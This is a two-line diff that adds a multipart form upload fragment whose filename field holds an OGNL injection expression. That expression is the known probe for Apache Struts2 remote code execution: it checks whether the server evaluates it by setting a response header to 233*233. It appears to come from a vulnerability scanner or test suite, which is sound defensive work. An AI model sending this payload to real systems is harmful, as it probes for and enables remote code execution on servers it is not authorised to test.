@@ -1,0 +1,2 @@
+------WebKitFormBoundaryo1IQUXNWS0og9rIj
+Content-Disposition: form-data; name="upload"; filename="%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test',233*233)}xb"
